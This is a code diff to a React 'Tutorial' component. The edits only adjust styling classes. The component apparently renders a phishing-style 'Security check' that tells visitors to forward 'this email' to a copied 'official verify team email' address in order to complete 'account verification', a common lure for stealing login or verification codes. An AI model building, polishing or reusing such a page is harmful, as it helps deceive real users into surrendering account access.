@@ -86,30 +86,30 @@ const Tutorial = () => {
           </div>
 
           {/* Security Check */}
-          <div className="mb-6">
-            <h3 className="text-lg font-medium text-gray-800 sm:text-left mb-4">
+          <div className="mb-2">
+            <h3 className="text-lg font-medium text-gray-800 sm:text-left mb-2">
               Security check
             </h3>
-            <p className="text-gray-950 text-base mb-2">
+            <p className="text-gray-950 text-base mb-1">
               Forward this email to our official verify team email. Copy our
               email address:
             </p>
           </div>
 
           {/* Copy Email Section */}
-          <div className="items-center text-start gap-4 mb-6">
+          <div className="items-center text-start gap-4 mb-2">
             <p className="text-[#990033] font-bold text-lg text-start w-full sm:text-left">
               {emailToCopy}
             </p>
             <button
-              className="bg-[#00a3e0] my-2 hover:bg-[#2a7b99] text-white py-2 px-4 rounded w-[150px]"
+              className="bg-[#00a3e0] my-2 hover:bg-[#2a7b99] text-white py-3 px-6 rounded w-[150px]"
               onClick={() => copyToClipboard(emailToCopy)}
             >
               Copy
             </button>
           </div>
 
-          <p className="text-gray-600 text-sm font-bold mb-4 sm:text-left">
+          <p className="text-gray-950 text-base mb-2 font-bold">
             Follow the instructions to successfully complete your account
             verification.
           </p>
